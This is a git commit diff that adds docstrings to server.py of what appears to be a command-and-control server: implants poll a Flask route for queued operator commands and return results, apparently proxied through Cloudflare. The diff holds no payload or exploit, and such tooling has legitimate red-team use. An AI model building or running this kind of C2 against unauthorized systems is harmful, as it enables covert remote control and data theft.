4a9c84b6f8e246604d0113c19892c9b51fae5197
matt-culbert <culbertmatt@gmail.com>
2024-10-31 10:49:07 -0400

    better function documentation

--- server.py
+++ server.py
@@ -13,13 +13,14 @@ import pw_hash
 app = Flask(__name__)
 implant_checkout = {}
 
-# Command queues for each service identified by a 4-digit ID
+# Command queues for each implant identified by a 4-digit ID
 implant_command_queues = {
     "1234": Queue(),
     "5678": Queue(),
 }
 
 # Result storage for each user
+# Keeping this as a nested dict for now
 result_storage = {
     "tester": [],
     "matt_tester": [],
@@ -36,11 +37,23 @@ logging.basicConfig(
 
 
 def add_user(new_user_id):
+    """
+    Adds a new user to the result storage dict
+    :param new_user_id: The users ID to add
+    :return: Nothing
+    """
     logger.info(f"adding new user {new_user_id}")
     result_storage.setdefault(new_user_id, [])
 
 
 def add_command(implant_id, operator, command):
+    """
+    Add a command to the implants queue
+    :param implant_id: The implant ID to send the command to
+    :param operator: The operator who set the command
+    :param command: The command itself to be run
+    :return: Nothing
+    """
     queue = implant_command_queues.get(implant_id)
     if queue:
         queue.put((operator, command))
@@ -53,7 +66,11 @@ def add_command(implant_id, operator, command):
 
 
 def get_results(user_id):
-    # Get the users dict
+    """
+    Get the users result storage
+    :param user_id: The user ID to get the storage for
+    :return: The results if any
+    """
     fetched = str(result_storage.get(user_id, []))
     logger.info(f"got results {fetched}")
     result_storage.pop(user_id, 0)
@@ -61,6 +78,11 @@ def get_results(user_id):
 
 
 def get_waiting_command(implant_id):
+    """
+    Gets the oldest command waiting in the implants queue
+    :param implant_id: The implant ID to get the queue for
+    :return: Either the operator name who set it and the command or False/False
+    """
     queue = implant_command_queues.get(implant_id)
     if queue:
         try:
@@ -77,15 +99,11 @@ def get_waiting_command(implant_id):
 
 def handle_update(uname, implant_id, result):
     """
-    Handle implants returning updates
-
-    Parameters:
-        uname (str): The user who should get the results
-        implant_id (str): The implant ID associated with the command
-        result (str): The result sent by the implant
-
-    Returns:
-        Boolean: True if success, otherwise returns error
+    Handle implants sending results of commands to the server
+    :param uname: The user who should get the results
+    :param implant_id: The implant ID associated with the command
+    :param result: The result sent by the implant
+    :return: Boolean: True if success, otherwise returns error
     """
     try:
         # decoded_res = ipv6_encoder.ipv6_to_string(result)
@@ -101,24 +119,33 @@ def handle_update(uname, implant_id, result):
 
 def checkout_command(imp_id, user_id):
     """
-    Adds a user_id to the implants queue to check who to send results to
+    Creates a queue that has the implant ID as the key and adds the user to it
+    Informs the server who needs the latest result
+    :param imp_id: The ID for the implant
+    :param user_id: The ID for the user who sent the command
+    :return:
     """
     implant_checkout.setdefault(imp_id, Queue())
     implant_checkout[imp_id].put(user_id)
 
 
 def handle_client(client_socket):
+    """
+    Handles the client sending and retrieving info
+    :param client_socket: The socket object the client uses to connect
+    :return: Uses the client socket to send data, function returns nothing
+    """
     try:
         # Receive the client's initial message
-        request = client_socket.recv(1024).decode()
+        client_request = client_socket.recv(1024).decode()
 
         # Check what type of message it is first before processing further
-        request_type, *remainder = request.split(" ", 1)
+        request_type, *remainder = client_request.split(" ", 1)
 
         match request_type:
             case "PUB":
                 logger.info("request to send command, attempting")
-                request_type, implant_id, uname, passw, *command = request.split(" ", 4)
+                request_type, implant_id, uname, passw, *command = client_request.split(" ", 4)
                 logger.info(f"checking authentication details for {uname}")
                 try:
                     if pw_hash.compare_hash(uname, passw):
@@ -132,7 +159,7 @@ def handle_client(client_socket):
 
             case "SUB":
                 logger.info("controller requesting implant last messages")
-                request_type, uname, passw, *message = request.split(" ", 3)
+                request_type, uname, passw, *message = client_request.split(" ", 3)
                 logger.info(f"checking authentication details for {uname}")
                 try:
                     if pw_hash.compare_hash(uname, passw):
@@ -157,7 +184,13 @@ def handle_client(client_socket):
 
 @app.route('/<path:path>', methods=['GET'])
 def catch_all_get(path):
+    """
+    Handles how implants query for waiting commands
+    :param path: This represents the implant ID
+    :return: Either the waiting command or error
+    """
     # Get the message FIFO
+    logger.info("GET incoming")
     try:
         operator, command = get_waiting_command(path)
         if operator and command is False:
@@ -172,6 +205,11 @@ def catch_all_get(path):
 
 @app.route('/<path:path>', methods=['POST'])
 def catch_all_post(path):
+    """
+    Handles the incoming data streams from an implant proxied through Cloudflare
+    :param path: This represents the implant ID
+    :return: Either 200 or error
+    """
     try:
         logger.info(f"{path} sending us data")
         # Get the data
@@ -196,6 +234,11 @@ def start_flask():
 
 
 def start_server():
+    """
+    Start the socket server and the flask server
+    Run an infinite loop until cancelled to handle socket requests
+    :return: Nothing
+    """
     flask_thread = Thread(target=start_flask)
     flask_thread.start()
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
